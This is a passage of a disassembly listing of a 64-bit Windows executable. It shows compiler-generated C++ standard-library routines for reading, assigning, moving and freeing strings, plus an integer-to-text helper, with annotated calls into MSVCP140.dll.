00000001400046e5  mov      rdi, rcx                                        
00000001400046e8  mov      qword ptr [rsp + 0x48], rcx                     
00000001400046ed  xor      r12d, r12d                                      
00000001400046f0  mov      dword ptr [rsp + 0x24], r12d                    
00000001400046f5  xor      r14b, r14b                                      
00000001400046f8  mov      byte ptr [rsp + 0x20], r14b                     
00000001400046fd  mov      r15, rcx                                        
0000000140004700  mov      qword ptr [rsp + 0x50], rcx                     
0000000140004705  mov      rax, qword ptr [rcx]                            
0000000140004708  movsxd   rcx, dword ptr [rax + 4]                        
000000014000470c  mov      rcx, qword ptr [rcx + r15 + 0x48]               
0000000140004711  test     rcx, rcx                                        
0000000140004714  je       0x14000471d                                      ; 0x14000471d
0000000140004716  mov      rax, qword ptr [rcx]                            
0000000140004719  call     qword ptr [rax + 8]                             
000000014000471c  nop                                                      
000000014000471d  xor      edx, edx                                        
000000014000471f  mov      rcx, rdi                                        
0000000140004722  call     qword ptr [rip + 0x3b20]                         ; 0x140008248 MSVCP140.dll!?_Ipfx@?$basic_istream@DU?$char_traits@D@std@@@std@@QEAA_N_N@Z
0000000140004728  mov      byte ptr [rsp + 0x58], al                       
000000014000472c  test     al, al                                          
000000014000472e  je       0x14000499c                                      ; 0x14000499c
0000000140004734  mov      rax, qword ptr [rdi]                            
0000000140004737  movsxd   rcx, dword ptr [rax + 4]                        
000000014000473b  add      rcx, rdi                                        
000000014000473e  lea      rdx, [rsp + 0x60]                               
0000000140004743  call     qword ptr [rip + 0x3b17]                         ; 0x140008260 MSVCP140.dll!?getloc@ios_base@std@@QEBA?AVlocale@2@XZ
0000000140004749  nop                                                      
000000014000474a  mov      rcx, rax                                        
000000014000474d  call     0x1400044fc                                      ; 0x1400044fc
0000000140004752  mov      r15, rax                                        
0000000140004755  mov      qword ptr [rsp + 0x40], rax                     
000000014000475a  mov      rcx, qword ptr [rsp + 0x68]                     
000000014000475f  test     rcx, rcx                                        
0000000140004762  je       0x14000477c                                      ; 0x14000477c
0000000140004764  mov      rax, qword ptr [rcx]                            
0000000140004767  call     qword ptr [rax + 0x10]                          
000000014000476a  mov      rcx, rax                                        
000000014000476d  test     rax, rax                                        
0000000140004770  je       0x14000477c                                      ; 0x14000477c
0000000140004772  mov      rax, qword ptr [rax]                            
0000000140004775  mov      edx, 1                                           ; 0x1
000000014000477a  call     qword ptr [rax]                                 
000000014000477c  mov      qword ptr [rsi + 0x10], 0                        ; 0x0
0000000140004784  cmp      qword ptr [rsi + 0x18], 0xf                      ; 0xf
0000000140004789  jbe      0x140004790                                      ; 0x140004790
000000014000478b  mov      rax, qword ptr [rsi]                            
000000014000478e  jmp      0x140004793                                      ; 0x140004793
0000000140004790  mov      rax, rsi                                        
0000000140004793  mov      byte ptr [rax], 0                                ; 0x0
0000000140004796  mov      rax, qword ptr [rdi]                            
0000000140004799  movsxd   rcx, dword ptr [rax + 4]                        
000000014000479d  mov      r13, qword ptr [rcx + rdi + 0x28]               
00000001400047a2  mov      qword ptr [rsp + 0x28], r13                     
00000001400047a7  movabs   rax, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
00000001400047b1  test     r13, r13                                        
00000001400047b4  jle      0x1400047bb                                      ; 0x1400047bb
00000001400047b6  cmp      r13, rax                                        
00000001400047b9  jb       0x1400047c3                                      ; 0x1400047c3
00000001400047bb  mov      r13, rax                                        
00000001400047be  mov      qword ptr [rsp + 0x28], rax                     
00000001400047c3  mov      rcx, qword ptr [rcx + rdi + 0x48]               
00000001400047c8  call     qword ptr [rip + 0x3a82]                         ; 0x140008250 MSVCP140.dll!?sgetc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ
00000001400047ce  movabs   r8, 0x8000000000000000                           ; -0x8000000000000000
00000001400047d8  test     r13, r13                                        
00000001400047db  je       0x1400047eb                                      ; 0x1400047eb
00000001400047dd  cmp      eax, -1                                          ; -0x1
00000001400047e0  jne      0x1400047f0                                      ; 0x1400047f0
00000001400047e2  lea      r12d, [rax + 2]                                 
00000001400047e6  mov      dword ptr [rsp + 0x24], r12d                    
00000001400047eb  jmp      0x140004997                                      ; 0x140004997
00000001400047f0  movzx    ecx, al                                         
00000001400047f3  mov      qword ptr [rsp + 0x38], rcx                     
00000001400047f8  mov      rax, qword ptr [r15 + 0x18]                     
00000001400047fc  test     byte ptr [rax + rcx*2], 0x48                     ; 0x48
0000000140004800  jne      0x1400047eb                                      ; 0x1400047eb
0000000140004802  mov      r13, qword ptr [rsi + 0x10]                     
0000000140004806  mov      r14, qword ptr [rsi + 0x18]                     
000000014000480a  mov      qword ptr [rsp + 0x30], r14                     
000000014000480f  cmp      r13, r14                                        
0000000140004812  jae      0x140004839                                      ; 0x140004839
0000000140004814  lea      rax, [r13 + 1]                                  
0000000140004818  mov      qword ptr [rsi + 0x10], rax                     
000000014000481c  cmp      r14, 0xf                                         ; 0xf
0000000140004820  jbe      0x140004827                                      ; 0x140004827
0000000140004822  mov      rax, qword ptr [rsi]                            
0000000140004825  jmp      0x14000482a                                      ; 0x14000482a
0000000140004827  mov      rax, rsi                                        
000000014000482a  mov      byte ptr [rax + r13], cl                        
000000014000482e  mov      byte ptr [rax + r13 + 1], 0                      ; 0x0
0000000140004834  jmp      0x14000495c                                      ; 0x14000495c
0000000140004839  movabs   rcx, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
0000000140004843  mov      rax, rcx                                        
0000000140004846  sub      rax, r13                                        
0000000140004849  cmp      rax, 1                                           ; 0x1
000000014000484d  jb       0x1400049fd                                      ; 0x1400049fd
0000000140004853  lea      r15, [r13 + 1]                                  
0000000140004857  or       r15, 0xf                                         ; 0xf
000000014000485b  cmp      r15, rcx                                        
000000014000485e  jbe      0x140004883                                      ; 0x140004883
0000000140004860  mov      r15, rcx                                        
0000000140004863  lea      rcx, [r8 + 0x27]                                
0000000140004867  call     0x140006320                                      ; 0x140006320
000000014000486c  test     rax, rax                                        
000000014000486f  je       0x14000492c                                      ; 0x14000492c
0000000140004875  lea      r14, [rax + 0x27]                               
0000000140004879  and      r14, 0xffffffffffffffe0                          ; -0x20
000000014000487d  mov      qword ptr [r14 - 8], rax                        
0000000140004881  jmp      0x1400048cf                                      ; 0x1400048cf
0000000140004883  mov      rdx, r14                                        
0000000140004886  shr      rdx, 1                                           ; 0x1
0000000140004889  mov      rax, rcx                                        
000000014000488c  sub      rax, rdx                                        
000000014000488f  cmp      r14, rax                                        
0000000140004892  ja       0x140004860                                      ; 0x140004860
0000000140004894  lea      rax, [rdx + r14]                                
0000000140004898  cmp      r15, rax                                        
000000014000489b  cmovb    r15, rax                                        
000000014000489f  lea      rax, [r15 + 1]                                  
00000001400048a3  test     rax, rax                                        
00000001400048a6  jne      0x1400048ad                                      ; 0x1400048ad
00000001400048a8  xor      r14d, r14d                                      
00000001400048ab  jmp      0x1400048cf                                      ; 0x1400048cf
00000001400048ad  cmp      rax, 0x1000                                      ; 0x1000
00000001400048b3  jb       0x1400048c4                                      ; 0x1400048c4
00000001400048b5  lea      rcx, [rax + 0x27]                               
00000001400048b9  cmp      rcx, rax                                        
00000001400048bc  jbe      0x140004a03                                      ; 0x140004a03
00000001400048c2  jmp      0x140004867                                      ; 0x140004867
00000001400048c4  mov      rcx, rax                                        
00000001400048c7  call     0x140006320                                      ; 0x140006320
00000001400048cc  mov      r14, rax                                        
00000001400048cf  lea      rax, [r13 + 1]                                  
00000001400048d3  mov      qword ptr [rsi + 0x10], rax                     
00000001400048d7  mov      qword ptr [rsi + 0x18], r15                     
00000001400048db  mov      r8, r13                                         
00000001400048de  mov      rcx, r14                                        
00000001400048e1  cmp      qword ptr [rsp + 0x30], 0xf                      ; 0xf
00000001400048e7  jbe      0x14000493d                                      ; 0x14000493d
00000001400048e9  mov      r15, qword ptr [rsi]                            
00000001400048ec  mov      rdx, r15                                        
00000001400048ef  call     0x140007208                                      ; 0x140007208
00000001400048f4  mov      rax, qword ptr [rsp + 0x38]                     
00000001400048f9  mov      byte ptr [r14 + r13], al                        
00000001400048fd  mov      byte ptr [r14 + r13 + 1], 0                      ; 0x0
0000000140004903  mov      rax, qword ptr [rsp + 0x30]                     
0000000140004908  lea      rdx, [rax + 1]                                  
000000014000490c  cmp      rdx, 0x1000                                      ; 0x1000
0000000140004913  jb       0x140004933                                      ; 0x140004933
0000000140004915  mov      rcx, qword ptr [r15 - 8]                        
0000000140004919  sub      r15, rcx                                        
000000014000491c  sub      r15, 8                                           ; 0x8
0000000140004920  cmp      r15, 0x1f                                        ; 0x1f
0000000140004924  ja       0x14000492c                                      ; 0x14000492c
0000000140004926  lea      rdx, [rax + 0x28]                               
000000014000492a  jmp      0x140004936                                      ; 0x140004936
000000014000492c  mov      ecx, 5                                           ; 0x5
0000000140004931  int      0x29                                             ; 0x29
0000000140004933  mov      rcx, r15                                        
0000000140004936  call     0x140006310                                      ; 0x140006310
000000014000493b  jmp      0x140004954                                      ; 0x140004954
000000014000493d  mov      rdx, rsi                                        
0000000140004940  call     0x140007208                                      ; 0x140007208
0000000140004945  mov      rax, qword ptr [rsp + 0x38]                     
000000014000494a  mov      byte ptr [r14 + r13], al                        
000000014000494e  mov      byte ptr [r14 + r13 + 1], 0                      ; 0x0
0000000140004954  mov      r15, qword ptr [rsp + 0x40]                     
0000000140004959  mov      qword ptr [rsi], r14                            
000000014000495c  mov      r14b, 1                                          ; 0x1
000000014000495f  mov      byte ptr [rsp + 0x20], r14b                     
0000000140004964  mov      r13, qword ptr [rsp + 0x28]                     
0000000140004969  dec      r13                                             
000000014000496c  mov      qword ptr [rsp + 0x28], r13                     
0000000140004971  mov      rax, qword ptr [rdi]                            
0000000140004974  movsxd   rcx, dword ptr [rax + 4]                        
0000000140004978  mov      rcx, qword ptr [rcx + rdi + 0x48]               
000000014000497d  call     qword ptr [rip + 0x38d5]                         ; 0x140008258 MSVCP140.dll!?snextc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ
0000000140004983  jmp      0x1400047ce                                      ; 0x1400047ce
0000000140004988  mov      r12d, dword ptr [rsp + 0x24]                    
000000014000498d  mov      r14b, byte ptr [rsp + 0x20]                     
0000000140004992  mov      rdi, qword ptr [rsp + 0x48]                     
0000000140004997  mov      r15, qword ptr [rsp + 0x50]                     
000000014000499c  mov      rax, qword ptr [rdi]                            
000000014000499f  movsxd   rcx, dword ptr [rax + 4]                        
00000001400049a3  mov      qword ptr [rcx + rdi + 0x28], 0                  ; 0x0
00000001400049ac  test     r14b, r14b                                      
00000001400049af  jne      0x1400049b5                                      ; 0x1400049b5
00000001400049b1  or       r12d, 2                                          ; 0x2
00000001400049b5  mov      rax, qword ptr [rdi]                            
00000001400049b8  movsxd   rcx, dword ptr [rax + 4]                        
00000001400049bc  add      rcx, rdi                                        
00000001400049bf  xor      r8d, r8d                                        
00000001400049c2  mov      edx, r12d                                       
00000001400049c5  call     qword ptr [rip + 0x38ad]                         ; 0x140008278 MSVCP140.dll!?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z
00000001400049cb  nop                                                      
00000001400049cc  mov      rcx, qword ptr [r15]                            
00000001400049cf  movsxd   rdx, dword ptr [rcx + 4]                        
00000001400049d3  mov      rcx, qword ptr [rdx + r15 + 0x48]               
00000001400049d8  test     rcx, rcx                                        
00000001400049db  je       0x1400049e4                                      ; 0x1400049e4
00000001400049dd  mov      rdx, qword ptr [rcx]                            
00000001400049e0  call     qword ptr [rdx + 0x10]                          
00000001400049e3  nop                                                      
00000001400049e4  mov      rax, rdi                                        
00000001400049e7  mov      rsi, qword ptr [rsp + 0xb0]                     
00000001400049ef  add      rsp, 0x70                                        ; 0x70
00000001400049f3  pop      r15                                             
00000001400049f5  pop      r14                                             
00000001400049f7  pop      r13                                             
00000001400049f9  pop      r12                                             
00000001400049fb  pop      rdi                                             
00000001400049fc  ret                                                      
00000001400049fd  call     0x140001230                                      ; 0x140001230
0000000140004a02  nop                                                      
0000000140004a03  call     0x140001190                                      ; 0x140001190
0000000140004a08  int3                                                     
0000000140004a09  int3                                                     
0000000140004a0a  int3                                                     
0000000140004a0b  int3                                                     

; FUNCTION 0x140004a0c

0000000140004a0c  mov      qword ptr [rsp + 0x18], rbx                     
0000000140004a11  push     rbp                                             
0000000140004a12  push     rsi                                             
0000000140004a13  push     rdi                                             
0000000140004a14  push     r14                                             
0000000140004a16  push     r15                                             
0000000140004a18  sub      rsp, 0x20                                        ; 0x20
0000000140004a1c  mov      rbx, rcx                                        
0000000140004a1f  mov      r15, rdx                                        
0000000140004a22  mov      rcx, rdx                                        
0000000140004a25  call     0x140007220                                      ; 0x140007220
0000000140004a2a  mov      r14, qword ptr [rbx + 0x18]                     
0000000140004a2e  mov      rbp, rax                                        
0000000140004a31  cmp      rax, r14                                        
0000000140004a34  ja       0x140004a5f                                      ; 0x140004a5f
0000000140004a36  cmp      r14, 0xf                                         ; 0xf
0000000140004a3a  jbe      0x140004a41                                      ; 0x140004a41
0000000140004a3c  mov      rdi, qword ptr [rbx]                            
0000000140004a3f  jmp      0x140004a44                                      ; 0x140004a44
0000000140004a41  mov      rdi, rbx                                        
0000000140004a44  mov      r8, rbp                                         
0000000140004a47  mov      qword ptr [rbx + 0x10], rbp                     
0000000140004a4b  mov      rdx, r15                                        
0000000140004a4e  mov      rcx, rdi                                        
0000000140004a51  call     0x14000720e                                      ; 0x14000720e
0000000140004a56  mov      byte ptr [rdi + rbp], 0                          ; 0x0
0000000140004a5a  jmp      0x140004b4f                                      ; 0x140004b4f
0000000140004a5f  movabs   rsi, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
0000000140004a69  cmp      rbp, rsi                                        
0000000140004a6c  ja       0x140004b63                                      ; 0x140004b63
0000000140004a72  mov      rcx, rbp                                        
0000000140004a75  or       rcx, 0xf                                         ; 0xf
0000000140004a79  cmp      rcx, rsi                                        
0000000140004a7c  jbe      0x140004aa8                                      ; 0x140004aa8
0000000140004a7e  movabs   rcx, 0x8000000000000000                          ; -0x8000000000000000
0000000140004a88  add      rcx, 0x27                                        ; 0x27
0000000140004a8c  call     0x140006320                                      ; 0x140006320
0000000140004a91  test     rax, rax                                        
0000000140004a94  je       0x140004b3d                                      ; 0x140004b3d
0000000140004a9a  lea      rdi, [rax + 0x27]                               
0000000140004a9e  and      rdi, 0xffffffffffffffe0                          ; -0x20
0000000140004aa2  mov      qword ptr [rdi - 8], rax                        
0000000140004aa6  jmp      0x140004af6                                      ; 0x140004af6
0000000140004aa8  mov      rdx, r14                                        
0000000140004aab  mov      rax, rsi                                        
0000000140004aae  shr      rdx, 1                                           ; 0x1
0000000140004ab1  sub      rax, rdx                                        
0000000140004ab4  cmp      r14, rax                                        
0000000140004ab7  ja       0x140004a7e                                      ; 0x140004a7e
0000000140004ab9  lea      rax, [rdx + r14]                                
0000000140004abd  mov      rsi, rcx                                        
0000000140004ac0  cmp      rcx, rax                                        
0000000140004ac3  cmovb    rsi, rax                                        
0000000140004ac7  lea      rax, [rsi + 1]                                  
0000000140004acb  test     rax, rax                                        
0000000140004ace  jne      0x140004ad4                                      ; 0x140004ad4
0000000140004ad0  xor      edi, edi                                        
0000000140004ad2  jmp      0x140004af6                                      ; 0x140004af6
0000000140004ad4  cmp      rax, 0x1000                                      ; 0x1000
0000000140004ada  jb       0x140004aeb                                      ; 0x140004aeb
0000000140004adc  lea      rcx, [rax + 0x27]                               
0000000140004ae0  cmp      rcx, rax                                        
0000000140004ae3  jbe      0x140004b69                                      ; 0x140004b69
0000000140004ae9  jmp      0x140004a8c                                      ; 0x140004a8c
0000000140004aeb  mov      rcx, rax                                        
0000000140004aee  call     0x140006320                                      ; 0x140006320
0000000140004af3  mov      rdi, rax                                        
0000000140004af6  mov      r8, rbp                                         
0000000140004af9  mov      qword ptr [rbx + 0x10], rbp                     
0000000140004afd  mov      rdx, r15                                        
0000000140004b00  mov      qword ptr [rbx + 0x18], rsi                     
0000000140004b04  mov      rcx, rdi                                        
0000000140004b07  call     0x140007208                                      ; 0x140007208
0000000140004b0c  mov      byte ptr [rdi + rbp], 0                          ; 0x0
0000000140004b10  cmp      r14, 0xf                                         ; 0xf
0000000140004b14  jbe      0x140004b4c                                      ; 0x140004b4c
0000000140004b16  mov      rax, qword ptr [rbx]                            
0000000140004b19  lea      rdx, [r14 + 1]                                  
0000000140004b1d  cmp      rdx, 0x1000                                      ; 0x1000
0000000140004b24  jb       0x140004b44                                      ; 0x140004b44
0000000140004b26  mov      rcx, qword ptr [rax - 8]                        
0000000140004b2a  sub      rax, rcx                                        
0000000140004b2d  sub      rax, 8                                           ; 0x8
0000000140004b31  cmp      rax, 0x1f                                        ; 0x1f
0000000140004b35  ja       0x140004b3d                                      ; 0x140004b3d
0000000140004b37  lea      rdx, [r14 + 0x28]                               
0000000140004b3b  jmp      0x140004b47                                      ; 0x140004b47
0000000140004b3d  mov      ecx, 5                                           ; 0x5
0000000140004b42  int      0x29                                             ; 0x29
0000000140004b44  mov      rcx, rax                                        
0000000140004b47  call     0x140006310                                      ; 0x140006310
0000000140004b4c  mov      qword ptr [rbx], rdi                            
0000000140004b4f  mov      rax, rbx                                        
0000000140004b52  mov      rbx, qword ptr [rsp + 0x60]                     
0000000140004b57  add      rsp, 0x20                                        ; 0x20
0000000140004b5b  pop      r15                                             
0000000140004b5d  pop      r14                                             
0000000140004b5f  pop      rdi                                             
0000000140004b60  pop      rsi                                             
0000000140004b61  pop      rbp                                             
0000000140004b62  ret                                                      
0000000140004b63  call     0x140001230                                      ; 0x140001230
0000000140004b68  int3                                                     
0000000140004b69  call     0x140001190                                      ; 0x140001190
0000000140004b6e  int3                                                     
0000000140004b6f  int3                                                     

; FUNCTION 0x140004b70

0000000140004b70  push     rbx                                             
0000000140004b72  sub      rsp, 0x20                                        ; 0x20
0000000140004b76  mov      rbx, rcx                                        
0000000140004b79  mov      rcx, qword ptr [rcx + 0x18]                     
0000000140004b7d  cmp      rcx, 0xf                                         ; 0xf
0000000140004b81  jbe      0x140004bbc                                      ; 0x140004bbc
0000000140004b83  mov      rax, qword ptr [rbx]                            
0000000140004b86  lea      rdx, [rcx + 1]                                  
0000000140004b8a  cmp      rdx, 0x1000                                      ; 0x1000
0000000140004b91  jb       0x140004bb1                                      ; 0x140004bb1
0000000140004b93  mov      r8, qword ptr [rax - 8]                         
0000000140004b97  sub      rax, r8                                         
0000000140004b9a  sub      rax, 8                                           ; 0x8
0000000140004b9e  cmp      rax, 0x1f                                        ; 0x1f
0000000140004ba2  ja       0x140004baa                                      ; 0x140004baa
0000000140004ba4  lea      rdx, [rcx + 0x28]                               
0000000140004ba8  jmp      0x140004bb4                                      ; 0x140004bb4
0000000140004baa  mov      ecx, 5                                           ; 0x5
0000000140004baf  int      0x29                                             ; 0x29
0000000140004bb1  mov      r8, rax                                         
0000000140004bb4  mov      rcx, r8                                         
0000000140004bb7  call     0x140006310                                      ; 0x140006310
0000000140004bbc  mov      qword ptr [rbx + 0x10], 0                        ; 0x0
0000000140004bc4  mov      qword ptr [rbx + 0x18], 0xf                      ; 0xf
0000000140004bcc  mov      byte ptr [rbx], 0                                ; 0x0
0000000140004bcf  add      rsp, 0x20                                        ; 0x20
0000000140004bd3  pop      rbx                                             
0000000140004bd4  ret                                                      
0000000140004bd5  int3                                                     
0000000140004bd6  int3                                                     
0000000140004bd7  int3                                                     

; FUNCTION 0x140004bd8

0000000140004bd8  mov      qword ptr [rsp + 0x18], rbx                     
0000000140004bdd  push     rdi                                             
0000000140004bde  sub      rsp, 0x20                                        ; 0x20
0000000140004be2  mov      rdi, rdx                                        
0000000140004be5  mov      rbx, rcx                                        
0000000140004be8  cmp      rcx, rdx                                        
0000000140004beb  je       0x140004c5c                                      ; 0x140004c5c
0000000140004bed  mov      rcx, qword ptr [rcx + 0x18]                     
0000000140004bf1  cmp      rcx, 0xf                                         ; 0xf
0000000140004bf5  jbe      0x140004c30                                      ; 0x140004c30
0000000140004bf7  mov      rax, qword ptr [rbx]                            
0000000140004bfa  lea      rdx, [rcx + 1]                                  
0000000140004bfe  cmp      rdx, 0x1000                                      ; 0x1000
0000000140004c05  jb       0x140004c25                                      ; 0x140004c25
0000000140004c07  mov      r8, qword ptr [rax - 8]                         
0000000140004c0b  sub      rax, r8                                         
0000000140004c0e  sub      rax, 8                                           ; 0x8
0000000140004c12  cmp      rax, 0x1f                                        ; 0x1f
0000000140004c16  ja       0x140004c1e                                      ; 0x140004c1e
0000000140004c18  lea      rdx, [rcx + 0x28]                               
0000000140004c1c  jmp      0x140004c28                                      ; 0x140004c28
0000000140004c1e  mov      ecx, 5                                           ; 0x5
0000000140004c23  int      0x29                                             ; 0x29
0000000140004c25  mov      r8, rax                                         
0000000140004c28  mov      rcx, r8                                         
0000000140004c2b  call     0x140006310                                      ; 0x140006310
0000000140004c30  mov      qword ptr [rbx + 0x18], 0xf                      ; 0xf
0000000140004c38  xor      eax, eax                                        
0000000140004c3a  mov      qword ptr [rbx + 0x10], rax                     
0000000140004c3e  mov      byte ptr [rbx], al                              
0000000140004c40  movups   xmm0, xmmword ptr [rdi]                         
0000000140004c43  movups   xmmword ptr [rbx], xmm0                         
0000000140004c46  movups   xmm1, xmmword ptr [rdi + 0x10]                  
0000000140004c4a  movups   xmmword ptr [rbx + 0x10], xmm1                  
0000000140004c4e  mov      qword ptr [rdi + 0x10], rax                     
0000000140004c52  mov      qword ptr [rdi + 0x18], 0xf                      ; 0xf
0000000140004c5a  mov      byte ptr [rdi], al                              
0000000140004c5c  mov      rax, rbx                                        
0000000140004c5f  mov      rbx, qword ptr [rsp + 0x40]                     
0000000140004c64  add      rsp, 0x20                                        ; 0x20
0000000140004c68  pop      rdi                                             
0000000140004c69  ret                                                      
0000000140004c6a  int3                                                     
0000000140004c6b  int3                                                     

; FUNCTION 0x140004c6c

0000000140004c6c  mov      qword ptr [rsp + 0x18], rbx                     
0000000140004c71  mov      qword ptr [rsp + 0x20], rbp                     
0000000140004c76  push     rsi                                             
0000000140004c77  push     rdi                                             
0000000140004c78  push     r14                                             
0000000140004c7a  sub      rsp, 0x20                                        ; 0x20
0000000140004c7e  xorps    xmm0, xmm0                                      
0000000140004c81  mov      rbx, rcx                                        
0000000140004c84  movups   xmmword ptr [rcx], xmm0                         
0000000140004c87  mov      qword ptr [rcx + 0x10], 0                        ; 0x0
0000000140004c8f  mov      r14, rdx                                        
0000000140004c92  mov      qword ptr [rcx + 0x18], 0                        ; 0x0
0000000140004c9a  mov      rcx, rdx                                        
0000000140004c9d  call     0x140007220                                      ; 0x140007220
0000000140004ca2  movabs   rbp, 0x7fffffffffffffff                          ; 0x7fffffffffffffff
0000000140004cac  mov      rsi, rax                                        
0000000140004caf  cmp      rax, rbp                                        
0000000140004cb2  ja       0x140004d82                                      ; 0x140004d82
0000000140004cb8  cmp      rax, 0xf                                         ; 0xf
0000000140004cbc  ja       0x140004ce1                                      ; 0x140004ce1
0000000140004cbe  mov      r8, rax                                         
0000000140004cc1  mov      qword ptr [rbx + 0x10], rax                     
0000000140004cc5  mov      rdx, r14                                        
0000000140004cc8  mov      qword ptr [rbx + 0x18], 0xf                      ; 0xf
0000000140004cd0  mov      rcx, rbx                                        
0000000140004cd3  call     0x140007208                                      ; 0x140007208
0000000140004cd8  mov      byte ptr [rbx + rsi], 0                          ; 0x0
0000000140004cdc  jmp      0x140004d6c                                      ; 0x140004d6c
0000000140004ce1  or       rax, 0xf                                         ; 0xf
0000000140004ce5  cmp      rax, rbp                                        
0000000140004ce8  jbe      0x140004d07                                      ; 0x140004d07
0000000140004cea  movabs   rcx, 0x8000000000000000                          ; -0x8000000000000000
0000000140004cf4  add      rcx, 0x27                                        ; 0x27
0000000140004cf8  call     0x140006320                                      ; 0x140006320
0000000140004cfd  test     rax, rax                                        
0000000140004d00  jne      0x140004d36                                      ; 0x140004d36
0000000140004d02  lea      ecx, [rax + 5]                                  
0000000140004d05  int      0x29                                             ; 0x29
0000000140004d07  mov      ecx, 0x16                                        ; 0x16
0000000140004d0c  mov      rbp, rax                                        
0000000140004d0f  cmp      rax, rcx                                        
0000000140004d12  cmovb    rbp, rcx                                        
0000000140004d16  lea      rax, [rbp + 1]                                  
0000000140004d1a  test     rax, rax                                        
0000000140004d1d  jne      0x140004d23                                      ; 0x140004d23
0000000140004d1f  xor      edi, edi                                        
0000000140004d21  jmp      0x140004d4f                                      ; 0x140004d4f
0000000140004d23  cmp      rax, 0x1000                                      ; 0x1000
0000000140004d29  jb       0x140004d44                                      ; 0x140004d44
0000000140004d2b  lea      rcx, [rax + 0x27]                               
0000000140004d2f  cmp      rcx, rax                                        
0000000140004d32  jbe      0x140004d88                                      ; 0x140004d88
0000000140004d34  jmp      0x140004cf8                                      ; 0x140004cf8
0000000140004d36  lea      rdi, [rax + 0x27]                               
0000000140004d3a  and      rdi, 0xffffffffffffffe0                          ; -0x20
0000000140004d3e  mov      qword ptr [rdi - 8], rax                        
0000000140004d42  jmp      0x140004d4f                                      ; 0x140004d4f
0000000140004d44  mov      rcx, rax                                        
0000000140004d47  call     0x140006320                                      ; 0x140006320
0000000140004d4c  mov      rdi, rax                                        
0000000140004d4f  mov      r8, rsi                                         
0000000140004d52  mov      qword ptr [rbx], rdi                            
0000000140004d55  mov      rdx, r14                                        
0000000140004d58  mov      qword ptr [rbx + 0x10], rsi                     
0000000140004d5c  mov      rcx, rdi                                        
0000000140004d5f  mov      qword ptr [rbx + 0x18], rbp                     
0000000140004d63  call     0x140007208                                      ; 0x140007208
0000000140004d68  mov      byte ptr [rdi + rsi], 0                          ; 0x0
0000000140004d6c  mov      rbp, qword ptr [rsp + 0x58]                     
0000000140004d71  mov      rax, rbx                                        
0000000140004d74  mov      rbx, qword ptr [rsp + 0x50]                     
0000000140004d79  add      rsp, 0x20                                        ; 0x20
0000000140004d7d  pop      r14                                             
0000000140004d7f  pop      rdi                                             
0000000140004d80  pop      rsi                                             
0000000140004d81  ret                                                      
0000000140004d82  call     0x140001230                                      ; 0x140001230
0000000140004d87  int3                                                     
0000000140004d88  call     0x140001190                                      ; 0x140001190
0000000140004d8d  int3                                                     
0000000140004d8e  int3                                                     
0000000140004d8f  int3                                                     

; FUNCTION 0x140004d90

0000000140004d90  sub      rsp, 0x28                                        ; 0x28
0000000140004d94  mov      rdx, qword ptr [rcx]                            
0000000140004d97  mov      rax, qword ptr [rdx]                            
0000000140004d9a  movsxd   rcx, dword ptr [rax + 4]                        
0000000140004d9e  mov      rcx, qword ptr [rcx + rdx + 0x48]               
0000000140004da3  test     rcx, rcx                                        
0000000140004da6  je       0x140004daf                                      ; 0x140004daf
0000000140004da8  mov      rax, qword ptr [rcx]                            
0000000140004dab  call     qword ptr [rax + 0x10]                          
0000000140004dae  nop                                                      
0000000140004daf  add      rsp, 0x28                                        ; 0x28
0000000140004db3  ret                                                      
0000000140004db4  mov      r8d, edx                                        
0000000140004db7  cmp      edx, 0xa                                         ; 0xa
0000000140004dba  jae      0x140004dc8                                      ; 0x140004dc8
0000000140004dbc  lea      rax, [rcx - 1]                                  
0000000140004dc0  add      r8b, 0x30                                        ; 0x30
0000000140004dc4  mov      byte ptr [rax], r8b                             
0000000140004dc7  ret                                                      
0000000140004dc8  mov      eax, 0x51eb851f                                  ; 0x51eb851f
0000000140004dcd  mov      r9, rcx                                         
0000000140004dd0  mul      r8d                                             
0000000140004dd3  sub      rcx, 2                                           ; 0x2
0000000140004dd7  shr      edx, 5                                           ; 0x5
0000000140004dda  imul     eax, edx, 0x64                                   ; 0x64
0000000140004ddd  sub      r8d, eax                                        
0000000140004de0  mov      eax, r8d                                        
0000000140004de3  mov      r8d, edx                                        
0000000140004de6  lea      rdx, [rip + 0x42f3]                              ; 0x1400090e0 "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899WSADVEQ爊tdll"
0000000140004ded  movzx    eax, word ptr [rdx + rax*2]                     
0000000140004df1  mov      word ptr [rcx], ax                              
0000000140004df4  cmp      r8d, 0xa                                         ; 0xa
0000000140004df8  jae      0x140004dc8                                      ; 0x140004dc8
0000000140004dfa  test     r8d, r8d                                        
0000000140004dfd  je       0x140004e0a                                      ; 0x140004e0a
0000000140004dff  lea      rcx, [r9 - 3]                                   
0000000140004e03  add      r8b, 0x30                                        ; 0x30
0000000140004e07  mov      byte ptr [rcx], r8b                             
0000000140004e0a  mov      rax, rcx                                        
0000000140004e0d  ret                                                      
0000000140004e0e  int3                                                     
0000000140004e0f  int3                                                     

; FUNCTION 0x140004e10

0000000140004e10  mov      qword ptr [rsp + 0x20], rbx                     
0000000140004e15  push     rbp                                             
0000000140004e16  push     rsi                                             
0000000140004e17  push     rdi                                             
0000000140004e18  push     r12                                             
0000000140004e1a  push     r13                                             
0000000140004e1c  push     r14                                             
0000000140004e1e  push     r15                                             
0000000140004e20  sub      rsp, 0x20                                        ; 0x20
0000000140004e24  mov      rbp, qword ptr [rcx + 0x18]                     
0000000140004e28  mov      rsi, r8                                         
0000000140004e2b  mov      r14, qword ptr [rcx + 0x10]                     
0000000140004e2f  mov      rax, rbp                                        
0000000140004e32  sub      rax, r14                                        
0000000140004e35  mov      r13, rdx                                        
0000000140004e38  mov      rbx, rcx                                        
0000000140004e3b  cmp      r8, rax                                         
0000000140004e3e  ja       0x140004e6d                                      ; 0x140004e6d
0000000140004e40  lea      rax, [r8 + r14]                                 
0000000140004e44  mov      qword ptr [rcx + 0x10], rax                     
0000000140004e48  cmp      rbp, 0xf                                         ; 0xf
0000000140004e4c  jbe      0x140004e53                                      ; 0x140004e53
0000000140004e4e  mov      rdi, qword ptr [rcx]                            
0000000140004e51  jmp      0x140004e56                                      ; 0x140004e56
0000000140004e53  mov      rdi, rbx                                        
